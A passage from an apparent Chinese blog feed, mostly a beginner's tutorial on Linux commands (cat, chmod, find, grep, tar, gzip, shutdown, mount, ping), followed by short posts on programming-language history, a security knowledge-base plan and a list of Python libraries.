cat（Catenate，连锁）</code></font></h4><p><code>功能</code>：用于连接文件并打印到标准输出设备上</p><p><code>相关选项</code>：</p><blockquote><ul><li><strong>-n</strong>：由 1 开始对所有输出的行数编号</li><li><strong>-b</strong>：和 -n 相似，只不过对于空白行不编号</li><li><strong>-s</strong>：当遇到有连续两行以上的空白行，就代换为一行的空白行</li><li><strong>-E 或 —show-ends</strong> : 在每行结束处显示 $。</li></ul></blockquote><p><code>相关实例</code></p><p>把 textfile1 的文档内容加上行号后输入 textfile2 这个文档里：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat -n textfile1 &gt; textfile2</span><br></pre></td></tr></table></figure><p>把 textfile1 和 textfile2 的文档内容加上行号（空白行不加）之后将内容附加到 textfile3 文档里：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat -b textfile1 textfile2 &gt;&gt; textfile3</span><br></pre></td></tr></table></figure><p>抓取文件中感兴趣的关键字：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat 文件 | grep 关键字</span><br></pre></td></tr></table></figure><p><strong>cat创建文件</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">法一：cat &gt; 文件名 &lt;&lt;结束标记</span><br><span class="line">如果文件名已经存在，那么上述的命令格式会覆盖原来文件中的内容，</span><br><span class="line">要想不覆盖则用下面的：</span><br><span class="line">cat &gt;&gt; 文件名 &lt;&lt;结束标记</span><br><span class="line">=====================================</span><br><span class="line">法二：仅用cat &gt; 文件名，然后Ctrl + C退出bash</span><br></pre></td></tr></table></figure><p><img src="/images/104-1.png" alt="这里写图片描述"></p><blockquote><p>这篇可以看一下<a href="https://blog.csdn.net/XD_hebuters/article/details/79204812" target="_blank" rel="noopener">Linux cat命令使用</a></p></blockquote><h3 id="0x02-权限管理"><a href="#0x02-权限管理" class="headerlink" title="0x02 权限管理"></a><font color="brown"><code>0x02 权限管理</code></font></h3><p><a href>有关权限位请看我的另一篇博客：linux的权限位</a>，这里就再简单的介绍一下：</p><p><code>权限位</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-rwxrwxrwx   1      root  root 43531 Mar 16 13:02 图片1.png</span><br><span class="line">   权限位   引用计数  所有者  属组  大小   最后一次修改时间   文件名</span><br></pre></td></tr></table></figure><p><code>权限位的个数</code>：<strong>权限位是十位</strong></p><blockquote><p>第一位：代表文件类型</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;-：普通文件<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;d：目录文件<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp; l：链接文件</p><p>其他九位：代表各用户的权限<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;前三位：属主权限u<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp; 中间三位：属组权限g<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp; 后三位：其他人权限o</p></blockquote><p><code>r、w、x</code>：</p><blockquote><p>r 表示文件可读，用数字 4 来代表</p><p>w 表示文件可写，用数字 2 来代表</p><p>x 表示文件可执行，用数字 1 来代表</p></blockquote><p><code>权限意义</code>：</p><blockquote><p><strong>⇲ 权限对文件的含义：</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;r：读取文件内容 如：cat、more、head、tail<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;w：编辑、新增、修改文件内容 如：vi、echo 但是不包含删除文件<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;x：可执行 /tmp/11/22/abc </p><p><strong>⇲ 权限对目录的含义：</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;r：可以查询目录下文件名 如：ls<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;w：具有修改目录结构的权限 如：touch、rm、mv、cp<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;x：可以进入目录 如：cd</p></blockquote><h4 id="0x00-chmod（change-the-permissions-mode-of-a-file）"><a href="#0x00-chmod（change-the-permissions-mode-of-a-file）" class="headerlink" title="0x00 chmod（change the permissions mode of a file）"></a><font color="navy"><code>0x00 chmod（change the permissions mode of a file）</code></font></h4><p><code>功能</code>：修改权限</p><p><code>相关选项</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ugoa...][[+-=][rwxX]...][,...]</span><br></pre></td></tr></table></figure><p>其中：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;u 表示该文件的拥有者，g 表示与该文件的拥有者属于同一个群体(group)者，o 表示其他以外的人，a 表示这三者皆是</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;+ 表示增加权限、- 表示取消权限、= 表示唯一设定权限</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;r 表示可读取，w 表示可写入，x 表示可执行，X 表示只有当该文件是个子目录或者该文件已经被设定过为可执行</p><p>其他参数说明：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;-v : 显示权限变更的详细资料</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;-R : 对目前目录下的所有文件与子目录进行相同的权限变更(即以递回的方式逐个变更)</p><p><code>实例</code>：</p><p>将文件 file1.txt 设为所有人皆可读取 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod ugo+r file1.txt</span><br></pre></td></tr></table></figure><p>将文件 file1.txt 设为所有人皆可读取 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod a+r file1.txt</span><br></pre></td></tr></table></figure><p>将文件 file1.txt 与 file2.txt 设为该文件拥有者，与其所属同一个群体者可写入，但其他以外的人则不可写入 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod ug+w,o-w file1.txt file2.txt</span><br></pre></td></tr></table></figure><p>将 ex1.py 设定为只有该文件拥有者可以执行 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod u+x ex1.py</span><br></pre></td></tr></table></figure><p>将目前目录下的所有文件与子目录皆设为任何人可读取 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -R a+r *</span><br></pre></td></tr></table></figure><p>此外chmod也可以用数字来表示权限如 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 file</span><br></pre></td></tr></table></figure><p>语法为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod abc file</span><br></pre></td></tr></table></figure><p>其中a,b,c各为一个数字，分别表示User、Group、及Other的权限。</p><p><strong>r=4，w=2，x=1</strong></p><ul><li>若要rwx属性则4+2+1=7；</li><li>若要rw-属性则4+2=6；</li><li>若要r-x属性则4+1=5。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod a=rwx file</span><br></pre></td></tr></table></figure><p>和</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 file</span><br></pre></td></tr></table></figure><p>效果相同</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod ug=rwx,o=x file</span><br></pre></td></tr></table></figure><p>和</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 771 file</span><br></pre></td></tr></table></figure><h3 id="0x03-帮助命令"><a href="#0x03-帮助命令" class="headerlink" title="0x03 帮助命令"></a><font color="brown"><code>0x03 帮助命令</code></font></h3><h4 id="0x00-man（manual）"><a href="#0x00-man（manual）" class="headerlink" title="0x00 man（manual）"></a><font color="navy"><code>0x00 man（manual）</code></font></h4><p><code>功能</code>：查看命令的帮助</p><h4 id="0x01-help"><a href="#0x01-help" class="headerlink" title="0x01 help"></a><font color="navy"><code>0x01 help</code></font></h4><p><code>功能</code>：查看命令的帮助</p><h3 id="0x04-查找命令"><a href="#0x04-查找命令" class="headerlink" title="0x04 查找命令"></a><font color="brown"><code>0x04 查找命令</code></font></h3><h4 id="0x00-whereis（whereis）"><a href="#0x00-whereis（whereis）" class="headerlink" title="0x00 whereis（whereis）"></a><font color="navy"><code>0x00 whereis（whereis）</code></font></h4><p><code>功能</code>：查找命令的命令，同时看到帮助文档位置</p><p><code>实例</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@:/mnt/d/谷歌下载文件# whereis ls</span><br><span class="line">ls: /bin/ls /usr/share/man/man1/ls.1.gz</span><br></pre></td></tr></table></figure><h4 id="0x01-find"><a href="#0x01-find" class="headerlink" title="0x01 find"></a><font color="navy"><code>0x01 find</code></font></h4><p><code>功能</code>：搜索命令，会在给定位置搜寻与条件匹配的文件</p><p><code>命令格式</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find 查找位置 -name 文件名</span><br></pre></td></tr></table></figure><p><code>相关选项</code>：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;-name 文件名：按照文件名查找（区分大小写二）</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;-iname 文件名：按照文件名查找，不区分大小写</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;-user 用户名：按照属主用户名查找文件</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;-group 组名 按照属组组名查找文件</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;-size 文件名：按照文件大小k M 如：find / -size +50k</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;&nbsp;-type：按照文件类型查找(f=普通 d=目录 l=链接)</p><h4 id="0x02-grep"><a href="#0x02-grep" class="headerlink" title="0x02 grep"></a><font color="navy"><code>0x02 grep</code></font></h4><p><code>功能</code>：查找符合条件的字串</p><p><code>命令格式</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep 选项 &apos;字串&apos; 查找路径</span><br></pre></td></tr></table></figure><p>比如：在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep test *file</span><br></pre></td></tr></table></figure><p><code>相关选项</code>：</p><blockquote><p>-i：忽略大小写</p><p>-v：反向选择</p><p><strong>-A</strong>：除了显示符合范本样式的那一列之外，并显示该行之后的内容</p></blockquote><p><code>相关知识：管道符 “|”</code></p><blockquote><p><code>命令1 | 命令2</code>：命令 1 的执行结果，作为命令 2 的执行条件</p><p><code>cat 文件名 | grep &#39;字串&#39;</code>：提取含有字符串的行</p><p><code>ls -l /etc | more</code>：分屏显示 ls 内容</p></blockquote><h3 id="0x05-压缩和解压缩"><a href="#0x05-压缩和解压缩" class="headerlink" title="0x05 压缩和解压缩"></a><font color="brown"><code>0x05 压缩和解压缩</code></font></h3><p><code>相关知识：</code></p><blockquote><p><strong>➤ linux可以识别的常见压缩格式</strong>：.gz .bz2</p><p><strong>➤ 常见的压缩和打包命令</strong>：.tar.gz .tar.bz2</p></blockquote><h4 id="0x00-tar（Tape-archive，磁带档案）"><a href="#0x00-tar（Tape-archive，磁带档案）" class="headerlink" title="0x00 tar（Tape archive，磁带档案）"></a><font color="navy"><code>0x00 tar（Tape archive，磁带档案）</code></font></h4><p><code>功能</code>：能创建、查看和提取tar压缩文件</p><p><code>命令格式</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zcvf 压缩文件名 源文件  // 压缩文件</span><br></pre></td></tr></table></figure><p><code>相关选项</code>：</p><blockquote><p><code>创建压缩文件</code>：<code>tar -cvf 压缩文件名 源文件</code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;-c：建立新的备份文件（压缩）</p><p><code>查看压缩文件</code>：<code>tar -tvf 压缩文件名</code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;-t：列出备份文件的内容</p><p><code>提取对应压缩文件</code>：<code>tar -xvf 压缩文件名</code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;-x：从备份文件中还原文件</p><p><code>通用选项</code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;-v：显示指令执行过程</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▧&nbsp;-f：指定压缩包名</p><p><code>多个文件/目录压缩</code>：<code>tar czvf my.tar.gz file1 file2,...（file*）</code></p></blockquote><h4 id="0x01-gzip"><a href="#0x01-gzip" class="headerlink" title="0x01 gzip"></a><font color="navy"><code>0x01 gzip</code></font></h4><p><code>功能</code>：命令创建和提取gzip压缩文件</p><p><code>相关选项</code>：</p><p>压缩相关选项：</p><blockquote><p><code>1、保留原始文件</code></p><p>如果要保留输入（原始）文件，请使用-k选项：</p><p><code>$ gzip -k filename</code></p><p>保留原始文件的另一个选项是使用-c选项，它使gzip在标准输出上写入并将输出重定向到文件：</p><p><code>$ gzip -c filename &gt; filename.gz</code></p><p><code>2、详细输出</code></p><p>如果要查看减少百分比和正在处理的文件的名称，请使用-v选项：</p><p><code>$ gzip -v filename</code></p><p>返回数据：</p><p><code>filename:　7.5% -- replaced with filename.gz</code></p><p><code>3、压缩多个文件</code></p><p>你还可以将多个文件作为参数传递给命令，例如，要压缩名为file1、file2、file3的文件，你将运行以下命令：</p><p><code>$ gzip file1 file2 file3</code></p><p>上面的命令将创建三个压缩文件：file1.gz、file2.gz、file3.gz，要想将多个文件压缩至一个压缩包</p><p><code>$ gzip file1 file2 file3 &gt; file4.gz</code></p><p><code>4、压缩目录中的所有文件</code></p><p>要压缩给定目录中的所有文件，请使用-r选项：</p><p><code>$ gzip -r directory</code></p><p>gzip将递归遍历整个目录结构并压缩目录及其子目录中的所有文件。</p></blockquote><p>解压相关选项：</p><blockquote><p>1.要解压缩.gz文件，请使用-d选项：</p><p><code>gzip -d</code>：来提取压缩文件</p><p>但是不会保留压缩文件，要想保留压缩文件，用-k选项：</p><p><code>$ gzip -dk filename.gz</code></p><p>要一次解压缩多个文件，请将文件名作为参数传递给gzip：</p><p><code>$ gzip -d file1 file2 file3</code></p><p>当与-d和-r选项一起使用时，gzip以递归方式解压缩给定目录中的所有文件：</p><p><code>$ gzip -dr directory</code></p><p>2.与-l选项一起使用时，gzip显示有关给定压缩文件的统计信息：</p><p><code>gzip -l filename</code>：列出压缩文件的相关信息</p></blockquote><h3 id="0x05-关机和重启命令"><a href="#0x05-关机和重启命令" class="headerlink" title="0x05 关机和重启命令"></a><font color="brown"><code>0x05 关机和重启命令</code></font></h3><h4 id="0x00-shutdown"><a href="#0x00-shutdown" class="headerlink" title="0x00 shutdown"></a><font color="navy"><code>0x00 shutdown</code></font></h4><p><code>功能</code>：关机/重启</p><p><code>相关选项</code>：</p><blockquote><p><code>shutdown -h now</code>：立即关机</p><p><code>shutdown -r now</code>：立即重启</p><p><code>shutdown -t [seconds]</code>：设定在几秒钟之后进行关机程序</p><p><code>shutdown +5 “System will shutdown after 5 minutes”</code>：5分钟够关机并显示警告信息</p></blockquote><h4 id="0x01-reboot"><a href="#0x01-reboot" class="headerlink" title="0x01 reboot"></a><font color="navy"><code>0x01 reboot</code></font></h4><p><code>功能</code>：关机/重启挂载（重新启动）</p><h4 id="0x02-mount"><a href="#0x02-mount" class="headerlink" title="0x02 mount"></a><font color="navy"><code>0x02 mount</code></font></h4><p><code>相关知识点：光盘挂载</code></p><blockquote><ol><li><p>提一句Windows下，mount挂载，就是给磁盘分区提供一个盘符（C,D,E,…）。比如插入U盘后系统自动分配给了它I:盘符其实就是挂载，退优盘的时候进行安全弹出，其实就是卸载unmount。</p></li><li><p>Linux下，不像Windows可以有C,D,E,多个目录，Linux只有一个根目录/。在装系统时，我们分配给linux的所有区都在/下的某个位置，比如/home等等。</p></li><li><p>提问者插入了新硬盘，分了新磁盘区sdb1。它现在还不属于/。</p></li><li><p>我们虽然可以在一些图形桌面系统里找到他的位置，浏览管理里面的文件，但在命令行却不知怎么访问它的目录，比如无法使用cd或者ls。也无法在编程时指定一个目录对它操作。</p></li><li><p>这时提问者使用了 mount /dev/sdb1 ~/Share/ ，把新硬盘的区sdb1挂载到工作目录的~/Share/文件夹下，之后访问这个~/Share/文件夹就相当于访问这个硬盘2的sdb1分区了。对/Share/的任何操作，都相当于对sdb1里文件的操作。</p></li><li><p>所以Linux下，mount挂载的作用，就是<strong>将一个设备（通常是存储设备）挂接到一个已存在的目录上。</strong>访问这个目录就是访问该存储设备。</p></li><li><p><strong>linux操作系统将所有的设备都看作文件，它将整个计算机的资源都整合成一个大的文件目录。</strong>我们要访问存储设备中的文件，必须将文件所在的分区挂载到一个已存在的目录上，然后通过访问这个目录来访问存储设备。挂载就是把设备放在一个目录下，让系统知道怎么管理这个设备里的文件，了解这个存储设备的可读写特性之类的过程。</p></li><li><p>我们不是有/dev/sdb1 吗，直接对它操作不就行了？这不是它的目录吗？</p></li><li><p>这不是它的目录。虽然/dev是个目录，但/dev/sdb1不是目录。可以发现ls/dev/sdb1无法执行。/dev/sdb1，是一个类似指针的东西，指向这个分区的原始数据块。mount前，系统并不知道这个数据块哪部分数据代表文件，如何对它们操作。</p></li><li><p>插入CD，系统其实自动执行了 mount /dev/cdrom /media/cdrom。所以可以直接在/media/cdrom中对CD中的内容进行管理。</p></li></ol></blockquote><p><code>功能</code>：是经常会使用到的命令，它用于挂载Linux系统外的文件</p><p><code>案例</code>：</p><p>将 /dev/hda1 挂在 /mnt 之下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/hda1 /mnt（空目录）</span><br></pre></td></tr></table></figure><p>将 /dev/hda1 用唯读模式挂在 /mnt 之下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -o ro /dev/hda1 /mnt</span><br></pre></td></tr></table></figure><p>将 /tmp/image.iso 这个光碟的 image 档使用 loop 模式挂在 /mnt/cdrom之下。用这种方法可以将一般网络上可以找到的 Linux 光 碟 ISO 档在不烧录成光碟的情况下检视其内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#mount -o loop /tmp/image.iso /mnt/cdrom</span><br></pre></td></tr></table></figure><p><strong>光盘挂载</strong></p><blockquote><p>/dev/sda1 第一个scsi硬盘的第一分区</p><p>/dev/cdrom 光盘</p><p>/dev/hdc IDE硬盘 centos 5.5</p><p>/dev/sr0 光盘 centos 6.x</p><p>mount -t 文件系统 设备描述文件 挂载点（已经存在空目录）mount -t iso9660 /dev/cdrom /mnt/cdrom</p></blockquote><p><strong>光盘卸载</strong></p><blockquote><p>umount /dev/cdrom</p><p>umount /mnt/cdrom 注意：退出挂载目录，才能卸载</p><p>fdisk -l 查看设备名</p><p>mount -t vfat /dev/sdb1 /mnt/usb</p></blockquote><h3 id="0x06-网络命令"><a href="#0x06-网络命令" class="headerlink" title="0x06 网络命令"></a><font color="brown"><code>0x06 网络命令</code></font></h3><h4 id="0x00-ping"><a href="#0x00-ping" class="headerlink" title="0x00 ping"></a><font color="navy"><code>0x00 ping</code></font></h4><p><code>功能</code>：测试网络畅通性</p><p><code>命令格式</code>：<code>ping -c 次数 ip</code></p><h4 id="0x01-ifconfig"><a href="#0x01-ifconfig" class="headerlink" title="0x01 ifconfig"></a><font color="navy"><code>0x01 ifconfig</code></font></h4><p><code>功能</code>：查询本机网络信息</p><h4 id="0x-其他命令"><a href="#0x-其他命令" class="headerlink" title="0x.. 其他命令"></a><font color="navy"><code>0x.. 其他命令</code></font></h4><blockquote><p>其他相关命令见我转载的一篇博客：<a href="http://vbird.dic.ksu.edu.tw/linux_server/0140networkcommand/0140networkcommand-centos4.php" target="_blank" rel="noopener"><strong>Linux 常用网络命令介绍</strong></a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-目录操作命令&quot;&gt;&lt;a href=&quot;#0x00-目录操作命令&quot; class=&quot;headerlink&quot; title=&quot;0x00 目录操作命令&quot;&gt;&lt;/a&gt;&lt;font color=&quot;brown&quot;&gt;&lt;code&gt;0x00 目录操作命令&lt;/code&gt;&lt;/font&gt;&lt;/
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="知识库" scheme="https://muzibing.github.io/tags/%E7%9F%A5%E8%AF%86%E5%BA%93/"/>
    
      <category term="Linux" scheme="https://muzibing.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>编程语言的发展历史 from1954to2019</title>
    <link href="https://muzibing.github.io/2020/03/18/2020.03.17%EF%BC%88103%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/03/18/2020.03.17（103）/</id>
    <published>2020-03-17T16:00:00.000Z</published>
    <updated>2020-03-18T13:34:25.748Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/103-1.jpg" alt></p><blockquote><p>转载：<a href="https://www.levenez.com/lang/" target="_blank" rel="noopener"><strong>Computer Languages History</strong></a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/images/103-1.jpg&quot; alt&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;转载：&lt;a href=&quot;https://www.levenez.com/lang/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;strong&gt;C
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>知识库构建初想</title>
    <link href="https://muzibing.github.io/2020/03/16/2020.03.16%EF%BC%88102%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/03/16/2020.03.16（102）/</id>
    <published>2020-03-15T16:00:00.000Z</published>
    <updated>2020-03-16T14:51:30.639Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>随着安全学习的不断深入，发现做笔记以及积累的重要性，这段时间在我脑海里一直有个想法出现，那就是做专题知识点总结，包括web、二进制、密码学</p></blockquote><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a><font color="brown"><code>WEB</code></font></h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;随着安全学习的不断深入，发现做笔记以及积累的重要性，这段时间在我脑海里一直有个想法出现，那就是做专题知识点总结，包括web、二进制、密码学&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;h
      
    
    </summary>
    
    
      <category term="知识库" scheme="https://muzibing.github.io/tags/%E7%9F%A5%E8%AF%86%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>Python基本第三方库总结（0x00）：requests库（Python中唯一的非转基因库）</title>
    <link href="https://muzibing.github.io/2020/03/15/2020.03.15%EF%BC%88101%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/03/15/2020.03.15（101）/</id>
    <published>2020-03-14T16:00:00.000Z</published>
    <updated>2020-03-15T14:47:19.344Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>首先来看一下基本第三方库有什么？</p></blockquote><table><thead><tr><th style="text-align:center">库名</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center"><strong>Requests</strong></td><td style="text-align:center"><strong>Kenneth Reitz写的最富盛名的http库。每个Python程序员都应该有它</strong></td></tr><tr><td style="text-align:center"><strong>Scrapy</strong></td><td style="text-align:center"><strong>爬虫相关的工作</strong></td></tr><tr><td style="text-align:center">Re</td><td style="text-align:center">Python 中的正则表达式，与Requests库结合用</td></tr><tr><td style="text-align:center">wxPython</td><td style="text-align:center">Python的一个GUI（图形用户界面）工具，替代tkinter</td></tr><tr><td style="text-align:center"><strong>Pillow</strong></td><td style="text-align:center"><strong>是PIL（Python图形库）的一个友好分支。对于用户比PIL更加友好，对于任何在图形领域工作的人是必备的库</strong></td></tr><tr><td style="text-align:center">SQLAlchemy</td><td style="text-align:center">一个数据库的库</td></tr><tr><td style="text-align:center"><strong>BeautifulSoup</strong></td><td style="text-align:center"><strong>这个xml和html的解析库对于新手非常有用</strong></td></tr><tr><td style="text-align:center">Twisted</td><td style="text-align:center">对于网络应用开发者最重要的工具。它有非常优美的api，被很多Python开发大牛使用</td></tr><tr><td style="text-align:center">NumPy</td><td style="text-align:center">它为Python提供了很多高级的数学方法</td></tr><tr><td style="text-align:center">SciPy</td><td style="text-align:center">是一个Python的算法和数学工具库，它的功能把很多科学家从Ruby吸引到了Python</td></tr><tr><td style="text-align:center">matplotlib</td><td style="text-align:center">一个绘制数据图的库。对于数据科学家或分析师非常有用</td></tr><tr><td style="text-align:center"><strong>Pygame</strong></td><td style="text-align:center"><strong>哪个程序员不喜欢玩游戏和写游戏？这个库会让你在开发2D游戏的时候如虎添翼</strong></td></tr><tr><td style="text-align:center">Pyglet</td><td style="text-align:center">D动画和游戏开发引擎。非常有名的Python版本Minecraft就是用这个引擎做的</td></tr><tr><td style="text-align:center">pyQT</td><td style="text-align:center">Python的GUI工具。这是我在给Python脚本开发用户界面时次于wxPython的选择</td></tr><tr><td style="text-align:center">pyGtk</td><td style="text-align:center">也是Python GUI库。很有名的Bittorrent客户端就是用它做的</td></tr><tr><td style="text-align:center">Scapy</td><td style="text-align:center">用Python写的数据包探测和分析库</td></tr><tr><td style="text-align:center">pywin32</td><td style="text-align:center">一个提供和windows交互的方法和类的Python库</td></tr><tr><td style="text-align:center">nltk</td><td style="text-align:center">自然语言工具包。我知道大多数人不会用它，但它通用性非常高。如果你需要处理字符串的话，它是非常好的库。但它的功能远远不止如此，自己摸索一下吧</td></tr><tr><td style="text-align:center">nose</td><td style="text-align:center">Python的测试框架。被成千上万的Python程序员使用</td></tr><tr><td style="text-align:center">SymPy</td><td style="text-align:center">SymPy可以做代数评测、差异化、扩展、复数等等。它封装在一个纯Python发行版本里。</td></tr><tr><td style="text-align:center"><strong>IPython</strong></td><td style="text-align:center"><strong>怎么称赞这个工具的功能都不为过。它把Python的提示信息做到了极致。包括完成信息、历史信息、shell功能，以及其他很多很多方面。一定要研究一下它。</strong></td></tr><tr><td style="text-align:center"><strong>hashlib</strong></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">base64</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">os</td><td style="text-align:center"></td></tr></tbody></table><blockquote><p>在入手阶段，先挑几个重点库（字体加粗的）进行学习和总结：<strong>Requests</strong>、<strong>base64</strong>、<strong>hashlib</strong>、<strong>Re、BeautifulSoup</strong>、<strong>Pillow</strong>、<strong>os</strong>、<strong>Pygame</strong>、<strong>Scrapy</strong>、<strong>IPython</strong></p></blockquote><h3 id="1requests-库的基本用法"><a class="markdownIt-Anchor" href="#1requests-库的基本用法"></a> <code>1.Requests 库的基本用法</code></h3><p>首先来见识一下 